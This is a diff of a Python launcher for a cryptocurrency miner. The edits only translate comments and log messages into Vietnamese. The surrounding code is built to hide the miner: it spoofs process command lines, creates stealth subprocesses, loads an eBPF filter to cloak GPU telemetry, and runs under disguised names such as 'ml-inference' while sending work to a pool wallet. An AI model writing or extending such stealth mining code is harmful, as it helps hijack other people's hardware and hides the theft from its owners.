@@ -17,11 +17,11 @@ import select  # ✅ [select] (thư viện chọn I/O đa kênh – non-blocking
 from pathlib import Path
 from datetime import datetime
 
-# Thêm thư mục script vào sys.path để **resolve** (phân giải) các **local module imports** (import module cục bộ)
+# Thêm thư mục **script** (kịch bản) vào sys.path để **resolve** (phân giải đường dẫn) các **local module imports** (nhập module cục bộ)
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
 import psutil
-# **Import** (nhập) **cloaking utilities** (tiện ích cloaking - che giấu quy trình) cho **ml-inference process stealth** (chế độ ẩn của quy trình ml-inference)
+# **Import** (nhập khẩu) **cloaking utilities** (tiện ích che giấu – ẩn danh hóa tiến trình) cho **ml-inference process stealth** (chế độ ẩn danh của tiến trình suy luận máy học)
 from mining_environment.cpu_plugins.cloaking_lib.utils import (
     get_process_by_cmdline,
     spoof_cmdline,
@@ -29,13 +29,13 @@ from mining_environment.cpu_plugins.cloaking_lib.utils import (
     create_stealth_subprocess,
 )
 
-# **Import** (nhập) các **module** (mô-đun) từ **library** (thư viện) mining_environment
+# **Import** (nhập khẩu) các **module** (mô-đun – thành phần chức năng) từ **library** (thư viện) mining_environment
 from mining_environment.scripts.logging_config import setup_logging
 from mining_environment.scripts import setup_env, system_manager
 from mining_environment.scripts.privileged_operations import get_privileged_manager
 from mining_environment.cpu_plugins import get_inference_config
 
-# **Import** (nhập) **Mining Performance Logger** (trình ghi log hiệu suất khai thác)
+# **Import** (nhập khẩu) **Mining Performance Logger** (trình ghi nhật ký hiệu suất khai thác – theo dõi và ghi lại các chỉ số)
 from mining_environment.logging.mining_performance_logger import (
     register_mining_process,
     log_hash_rate,
@@ -46,7 +46,7 @@ from mining_environment.logging.mining_performance_logger import (
     mining_perf_logger
 )
 
-# Thiết lập **log directory path** (đường dẫn thư mục logs - tệp ghi nhật ký)
+# Thiết lập **log directory path** (đường dẫn thư mục logs – nơi lưu trữ các tệp ghi nhật ký)
 LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
 os.makedirs(LOGS_DIR, exist_ok=True)
 logger = setup_logging('start_mining', str(Path(LOGS_DIR) / 'start_mining.log'), 'INFO')
@@ -67,27 +67,27 @@ signal.signal(signal.SIGTERM, signal_handler)
 def initialize_environment():
     logger.info("Bắt đầu thiết lập môi trường khai thác.")
     try:
-        # **Load** (tải) **ML inference configuration** (cấu hình suy luận máy học)
+        # **Load** (tải dữ liệu) **ML inference configuration** (cấu hình suy luận máy học – thiết lập thông số cho quá trình suy luận)
         ml_config = get_inference_config(process_info=None, logger=logger)
         if not ml_config.validate_configuration():
-            logger.error("❌ ML inference configuration validation failed")
+            logger.error("❌ Xác thực cấu hình suy luận ML thất bại")
             sys.exit(1)
 
-        # **Setup** (thiết lập) **environment variables** (biến môi trường) từ **config** (cấu hình)
+        # **Setup** (thiết lập cài đặt) **environment variables** (biến môi trường – các tham số hệ thống) từ **config** (cấu hình)
         env_vars = ml_config.get_environment_variables()
         for key, value in env_vars.items():
             os.environ[key] = value
         
-        logger.info(f"🔧 ML Inference Config: {ml_config}")
+        logger.info(f"🔧 Cấu hình suy luận ML: {ml_config}")
         
         privileged_manager = get_privileged_manager(logger)
         security_context = privileged_manager.validate_security_context()
-        logger.info(f"Security Context: User={security_context['user']}, Root={security_context['is_root']}")
+        logger.info(f"Bối cảnh bảo mật: User={security_context['user']}, Root={security_context['is_root']}")
         if not security_context['is_root']:
             logger.warning("⚠️ Không chạy với quyền root - một số tính năng có thể không hoạt động")
         
         gpu_info = privileged_manager.check_gpu_access()
-        logger.info(f"GPU Access: Available={gpu_info['nvidia_smi_available']}, Count={gpu_info['gpu_count']}")
+        logger.info(f"Truy cập GPU: Available={gpu_info['nvidia_smi_available']}, Count={gpu_info['gpu_count']}")
         
         if os.getenv('ENABLE_EBPF_CLOAK', '1') == '1':
             preferred_path = "/opt/ebpf_filters/gpu_telemetry_filter.bpf.o"
@@ -131,7 +131,11 @@ def is_mining_process_running(process):
 
 def rotate_log_file(log_path, max_size_mb=50):
     """
-    **Log rotation** (xoay vòng log) để tránh **disk space issues** (vấn đề dung lượng đĩa)
+    **Log rotation** (xoay vòng tệp ghi nhật ký) để tránh **disk space issues** (vấn đề dung lượng đĩa cứng).
+    
+    Args:
+        log_path (str): Đường dẫn đến tệp log cần xoay vòng
+        max_size_mb (int): Kích thước tối đa (MB) trước khi xoay vòng
     """
     if not os.path.exists(log_path):
         return
@@ -142,44 +146,50 @@ def rotate_log_file(log_path, max_size_mb=50):
         if os.path.exists(backup_path):
             os.remove(backup_path)
         os.rename(log_path, backup_path)
-        logger.info(f"Log file rotated: {log_path} -> {backup_path}")
+        logger.info(f"Đã xoay vòng tệp log: {log_path} -> {backup_path}")
 
 def dual_logger_thread(process, log_file, process_name, log_lock):
     """
-    **Enhanced thread-safe dual logging** (ghi log kép an toàn luồng nâng cao) - 
-    **Real-time streaming** (truyền dữ liệu thời gian thực) với **hash detection** (phát hiện băm) và **metrics tracking** (theo dõi chỉ số)
+    Ghi nhật ký kép an toàn luồng nâng cao - truyền dữ liệu thời gian thực với phát hiện tốc độ băm và theo dõi các chỉ số hiệu suất.
+
+    
+    Args:
+        process: Tiến trình cần theo dõi và ghi log
+        log_file: Tệp log để ghi dữ liệu
+        process_name (str): Tên tiến trình để hiển thị
+        log_lock: Khóa luồng để đảm bảo thread-safe
     """
-    hash_rates = []  # **Hash rate tracking** (theo dõi tốc độ băm)
+    hash_rates = []  # **Hash rate tracking** (theo dõi tốc độ băm – ghi lại các giá trị tốc độ tính toán)
     start_time = time.time()
     line_count = 0
     
     try:
         while True:
-            # **Non-blocking I/O** (I/O không chặn) với **select** (chọn lọc)
+            # **Non-blocking I/O** (nhập/xuất không chặn) với **select** (chọn lọc dữ liệu)
             ready, _, _ = select.select([process.stdout], [], [], 1.0)
             if not ready:
-                # **Process termination check** (kiểm tra kết thúc tiến trình)
+                # **Process termination check** (kiểm tra trạng thái kết thúc tiến trình)
                 if process.poll() is not None:
                     break
                 continue
 
             line = process.stdout.readline()
-            # **EOF detection** (phát hiện kết thúc file)
+            # **EOF detection** (phát hiện kết thúc tệp dữ liệu)
             if line == '' and process.poll() is not None:
                 break
                 
             if line:
                 line_count += 1
                 
-                # **Thread-safe logging block** (khối ghi log an toàn luồng)
+                # **Thread-safe logging block** (khối ghi nhật ký an toàn luồng)
                 with log_lock:
                     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                     runtime = time.time() - start_time
                     
-                    # **Enhanced log format** (định dạng log nâng cao) với **runtime info** (thông tin thời gian chạy)
+                    # **Enhanced log format** (định dạng nhật ký nâng cao) với **runtime info** (thông tin thời gian vận hành)
                     formatted_line = f"[{timestamp}][{process_name}][R:{runtime:.0f}s] {line.strip()}"
                     
-                    # **Color-coded terminal output** (đầu ra terminal có mã màu)
+                    # **Color-coded terminal output** (đầu ra terminal có mã màu – hiển thị với màu sắc phân biệt)
                     if "error" in line.lower() or "failed" in line.lower():
                         terminal_output = f"\033[91m{formatted_line}\033[0m"  # Red
                     elif "H/s" in line or "accepted" in line.lower():
@@ -189,14 +199,14 @@ def dual_logger_thread(process, log_file, process_name, log_lock):
                     else:
                         terminal_output = formatted_line
                     
-                    # **Real-time terminal display** (hiển thị terminal thời gian thực)
+                    # **Real-time terminal display** (hiển thị terminal thời gian thực – cập nhật ngay lập tức)
                     print(terminal_output, flush=True)
                     
-                    # **File logging** (ghi log tệp) - **binary mode** (chế độ nhị phân)
+                    # **File logging** (ghi nhật ký vào tệp) - **binary mode** (chế độ nhị phân)
                     log_file.write(f"{formatted_line}\n".encode('utf-8'))
                     log_file.flush()
                     
-                    # **Log rotation check** (kiểm tra xoay vòng log)
+                    # **Log rotation check** (kiểm tra xoay vòng tệp nhật ký)
                     try:
                         if log_file.tell() > 50 * 1024 * 1024:
                             current_path = log_file.name
@@ -205,19 +215,19 @@ def dual_logger_thread(process, log_file, process_name, log_lock):
                             if os.path.exists(backup_path):
                                 os.remove(backup_path)
                             os.rename(current_path, backup_path)
-                            logger.info(f"📁 Log rotated: {current_path} -> {backup_path}")
-                            # **Reopen new file** (mở lại file mới)
+                            logger.info(f"📁 Đã xoay vòng log: {current_path} -> {backup_path}")
+                            # **Reopen new file** (mở lại tệp mới)
                             log_file = open(current_path, 'ab', buffering=0)
                     except Exception as rot_err:
-                        logger.warning(f"⚠️ Log rotation failed: {rot_err}")
+                        logger.warning(f"⚠️ Xoay vòng log thất bại: {rot_err}")
                     
-                    # **Advanced hash rate detection** (phát hiện tốc độ băm nâng cao)
+                    # **Advanced hash rate detection** (phát hiện tốc độ băm nâng cao – nhận diện các chỉ số hiệu suất)
                     hash_rate_match = re.search(r'(\d+(?:\.\d+)?)\s*(H/s|KH/s|MH/s|GH/s|TH/s)', line)
                     if hash_rate_match:
                         hash_rate = float(hash_rate_match.group(1))
                         unit = hash_rate_match.group(2)
                         
-                        # **Unit conversion** (chuyển đổi đơn vị)
+                        # **Unit conversion** (chuyển đổi đơn vị đo lường)
                         multiplier = {
                             'H/s': 1,
                             'KH/s': 1000,
@@ -227,15 +237,15 @@ def dual_logger_thread(process, log_file, process_name, log_lock):
                         }
                         hash_rate_hz = hash_rate * multiplier.get(unit, 1)
                         
-                        # **Hash rate tracking** (theo dõi tốc độ băm)
+                        # **Hash rate tracking** (theo dõi và lưu trữ tốc độ băm)
                         hash_rates.append(hash_rate_hz)
                         
-                        # **Performance metrics calculation** (tính toán chỉ số hiệu suất)
-                        if len(hash_rates) >= 5:  # **Moving average** (trung bình trượt) của 5 samples
+                        # **Performance metrics calculation** (tính toán các chỉ số hiệu suất chi tiết)
+                        if len(hash_rates) >= 5:  # **Moving average** (trung bình trượt) của 5 mẫu dữ liệu
                             recent_avg = sum(hash_rates[-5:]) / 5
                             total_avg = sum(hash_rates) / len(hash_rates)
                             
-                            # **Real-time metrics display** (hiển thị chỉ số thời gian thực)
+                            # **Real-time metrics display** (hiển thị các chỉ số thời gian thực)
                             metrics_line = (f"\033[96m📊 METRICS [{process_name}]: "
                                           f"Current={hash_rate:.2f} {unit} | "
                                           f"Avg5={recent_avg:.2f} H/s | "
@@ -244,10 +254,10 @@ def dual_logger_thread(process, log_file, process_name, log_lock):
                                           f"Runtime={runtime:.0f}s\033[0m")
                             print(metrics_line, flush=True)
                         
-                        # **Log hash rate** (ghi log tốc độ băm) để **performance system** (hệ thống hiệu suất)
+                        # **Log hash rate** (ghi nhật ký tốc độ băm) để **performance system** (hệ thống theo dõi hiệu suất)
                         log_hash_rate(process_name, hash_rate_hz)
                     
-                    # **Status indicators** (chỉ báo trạng thái) mỗi 100 dòng
+                    # **Status indicators** (chỉ báo trạng thái hoạt động) mỗi 100 dòng
                     if line_count % 100 == 0:
                         status_line = (f"\033[93m📈 STATUS [{process_name}]: "
                                      f"Lines={line_count} | Runtime={runtime:.0f}s | "
@@ -255,11 +265,11 @@ def dual_logger_thread(process, log_file, process_name, log_lock):
                         print(status_line, flush=True)
                         
     except Exception as e:
-        error_msg = f"❌ Error in dual_logger_thread [{process_name}]: {e}"
+        error_msg = f"❌ Lỗi trong dual_logger_thread [{process_name}]: {e}"
         logger.error(error_msg)
         print(f"\033[91m{error_msg}\033[0m", flush=True)
     finally:
-        # **Cleanup** (dọn dẹp) và **final stats** (thống kê cuối)
+        # **Cleanup** (dọn dẹp tài nguyên) và **final stats** (thống kê cuối cùng)
         try:
             if log_file and not log_file.closed:
                 log_file.close()
@@ -274,39 +284,48 @@ def dual_logger_thread(process, log_file, process_name, log_lock):
             final_stats += "\033[0m"
             
             print(final_stats, flush=True)
-            logger.info(f"Dual logger thread stopped for {process_name}: {runtime:.0f}s runtime")
+            logger.info(f"Luồng ghi log kép đã dừng cho {process_name}: thời gian chạy {runtime:.0f}s")
             
         except Exception as cleanup_err:
-            logger.error(f"Cleanup error in dual_logger_thread: {cleanup_err}")
+            logger.error(f"Lỗi dọn dẹp trong dual_logger_thread: {cleanup_err}")
 
 def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
     """
-    **Enhanced mining process** (quy trình khai thác nâng cao) với **dual logging** (ghi log kép), 
-    **log rotation** (xoay vòng log), và **thread-safe logging** (ghi log an toàn luồng).
+    **Enhanced mining process** (quy trình khai thác nâng cao) với **dual logging** (ghi nhật ký kép), 
+    **log rotation** (xoay vòng tệp nhật ký), và **thread-safe logging** (ghi nhật ký an toàn luồng).
+    
+    Args:
+        cpu (bool): True nếu là khai thác CPU, False nếu là GPU
+        retries (int): Số lần thử lại tối đa
+        delay (int): Thời gian chờ giữa các lần thử (giây)
+        privileged_manager: Trình quản lý quyền hạn
+    
+    Returns:
+        subprocess.Popen: Tiến trình khai thác nếu thành công, None nếu thất bại
     """
     executable = os.getenv('ML_COMMAND' if cpu else 'CUDA_COMMAND')
     if not executable or not os.path.isfile(executable) or not os.access(executable, os.X_OK):
-        logger.error(f"Tệp thực thi khai thác không hợp lệ hoặc không có quyền: {executable}")
+        logger.error(f"Tệp thực thi khai thác không hợp lệ hoặc không có quyền truy cập: {executable}")
         stop_event.set()
         return None
 
     mining_server = os.getenv('MINING_SERVER_CPU' if cpu else 'MINING_SERVER_GPU')
     mining_wallet = os.getenv('MINING_WALLET_CPU' if cpu else 'MINING_WALLET_GPU')
     if not mining_server or not mining_wallet:
-        logger.error("Biến môi trường MINING_SERVER hoặc MINING_WALLET không được thiết lập.")
+        logger.error("Các biến môi trường MINING_SERVER hoặc MINING_WALLET chưa được cấu hình.")
         stop_event.set()
         return None
 
     miner_tag = 'cpu' if cpu else 'gpu'
     miner_log_path = Path(LOGS_DIR) / f"{miner_tag}_miner.log"
     
-    # **Log rotation** (xoay vòng log) trước khi khởi chạy
+    # **Log rotation** (xoay vòng tệp nhật ký) trước khi khởi chạy tiến trình
     rotate_log_file(str(miner_log_path))
     
-    # **Thread-safe lock** (khóa an toàn luồng) cho **dual logging** (ghi log kép)
+    # **Thread-safe lock** (khóa an toàn luồng) cho **dual logging** (ghi nhật ký kép)
     log_lock = threading.Lock()
 
-    # Xác định **process name** (tên tiến trình) từ **resource_config.json** (tệp cấu hình tài nguyên)
+    # Xác định **process name** (tên tiến trình) từ **resource_config.json** (tệp cấu hình tài nguyên hệ thống)
     process_name = "ml-inference" if cpu else "inference-cuda"
     
     mining_command = [executable, '-o', mining_server, '-u', mining_wallet, '--tls']
@@ -320,10 +339,10 @@ def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
     enable_stealth = os.getenv('ENABLE_STEALTH_MODE', '1') == '1'
     
     if enable_ns and privileged_manager:
-        logger.info("Sử dụng PrivilegedOperationManager cho namespace isolation")
+        logger.info("Sử dụng PrivilegedOperationManager cho **namespace isolation** (cô lập không gian tên)")
 
     for attempt in range(1, retries + 1):
-        logger.info(f"Thử khởi chạy quá trình khai thác {'CPU' if cpu else 'GPU'} (Lần {attempt}/{retries})...")
+        logger.info(f"Thử khởi chạy quá trình khai thác {'CPU' if cpu else 'GPU'} (Lần thử {attempt}/{retries})...")
         try:
             # **Create subprocess** (tạo tiến trình con) với **PIPE** (đường ống) cho **dual logging** (ghi log kép)
             if enable_stealth and cpu:
@@ -685,9 +704,9 @@ def main():
         logger.info(f"📄 Final performance report saved to: {report_file}")
         
     except Exception as e:
-        logger.error(f"Error generating final performance report: {e}")
+        logger.error(f"Lỗi khi tạo báo cáo hiệu suất cuối cùng: {e}")
     
-    # **Log final mining operations** (ghi log các thao tác khai thác cuối cùng)
+    # **Log final mining operations** (ghi nhật ký các thao tác khai thác cuối cùng)
     with process_lock:
         if cpu_process:
             log_mining_operation("ml-inference", "STOP", cpu_process.pid, 
@@ -697,7 +716,7 @@ def main():
                                 {"reason": "shutdown", "uptime": time.time()})
     
     
-    # **Cleanup** (dọn dẹp) **legacy processes** (các tiến trình cũ)
+    # **Cleanup** (dọn dẹp tài nguyên) **legacy processes** (các tiến trình cũ)
     with process_lock:
         if cpu_process:
             logger.info(f"Dừng tiến trình CPU miner (PID: {cpu_process.pid})...")
